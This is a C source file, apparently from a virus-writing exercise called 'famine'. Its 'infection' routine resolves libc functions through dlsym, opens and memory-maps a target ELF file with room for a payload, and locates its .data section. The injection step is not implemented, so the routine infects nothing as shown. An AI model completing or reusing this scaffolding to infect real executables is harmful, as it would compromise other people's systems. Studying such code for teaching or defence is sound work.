#include "famine.h"
#include <signal.h>

static int  isCompatible(unsigned char e_ident[EI_NIDENT], Elf64_Half e_machine) {
  return (e_ident[EI_MAG0] == ELFMAG0 &&
          e_ident[EI_MAG1] == ELFMAG1 &&
          e_ident[EI_MAG2] == ELFMAG2 &&
          e_ident[EI_MAG3] == ELFMAG3 &&
          e_machine == EM_X86_64);
}

static Elf64_Shdr *getDataSectionHeader(Elf64_Ehdr *header, int (*strcmp)(const char *, const char *)) {
  Elf64_Shdr  *pointer;
  Elf64_Shdr  *shstrHeader;
  char        dataName[] = ".data";

  pointer = ((void *)header) + header->e_shoff;
  shstrHeader = ((void *)header) + header->e_shoff + sizeof(Elf64_Shdr) * header->e_shstrndx;
  while (strcmp(((void *)header) + shstrHeader->sh_offset + pointer->sh_name, dataName) != 0)
    pointer += 1;
  return (pointer);
}

int  infection(void *(*dlsym)(void *, const char *), void *handle,
const char *dirname,  const char *filename, const char *payload) {
  void    *(*malloc)(size_t);
  char    *(*strcpy)(char *, const char *);
  char    *(*strcat)(char *, const char *);
  size_t  (*strlen)(const char *);
  int     (*open)(const char *, int);
  int     (*close)(int);
  void    (*free)(void *);
  int     (*fstat)(int, int, struct stat *);
  int     (*dprintf)(int, const char *, ...);
  void    (*raise)(int);
  void    *(*mmap)(void *, size_t, int, int, int, off_t);
  int     (*munmap)(void *, size_t);
  int     (*strcmp)(const char *, const char *);
  char    mallocName[] = "malloc";
  char    strcpyName[] = "strcpy";
  char    strcatName[] = "strcat";
  char    strlenName[] = "strlen";
  char    openName[] = "open";
  char    closeName[] = "close";
  char    freeName[] = "free";
  char    fstatName[] = "__fxstat";
  char    mmapName[] = "mmap";
  char    munmapName[] = "munmap";
  char    dprintfName[] = "dprintf";
  char    raiseName[] = "raise";
  char    strcmpName[] = "strcmp";
  char    slash[] = "/";

  malloc = dlsym(handle, mallocName);
  strcpy = dlsym(handle, strcpyName);
  strcat = dlsym(handle, strcatName);
  open = dlsym(handle, openName);
  close = dlsym(handle, closeName);
  free = dlsym(handle, freeName);
  fstat = dlsym(handle, fstatName);
  mmap = dlsym(handle, mmapName);
  munmap = dlsym(handle, munmapName);
  strlen = dlsym(handle, strlenName);
  dprintf = dlsym(handle, dprintfName);
  raise = dlsym(handle, raiseName);
  strcmp = dlsym(handle, strcmpName);

  int         fd;
  char        *tmp;
  struct stat stats;
  struct bfile file;

  if ((tmp = malloc(strlen(dirname) + strlen(filename) + 2)) == NULL)
    return (-1);
  strcpy(tmp, dirname);
  strcat(tmp, slash);
  strcat(tmp, filename);
  if ((fd = open(tmp, O_RDWR)) == -1) {
    free(tmp);
    return (1);
  }
  free(tmp);
  if (fstat(1, fd, &stats) == -1) {
    raise(SIGTRAP);
    close(fd);
    return (-1);
  }
  file.size = stats.st_size;
  if ((file.header = mmap(NULL, file.size + strlen(payload) + 1, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED) {
    close(fd);
    return (-1);
  }
  close(fd);
  if ((size_t)(file.size) < sizeof(Elf64_Ehdr) || !isCompatible(file.header->e_ident, file.header->e_machine))
    return (1);
  Elf64_Shdr  *data;
  data = getDataSectionHeader(file.header, strcmp);
  munmap(file.header, file.size);
  return (0);
}
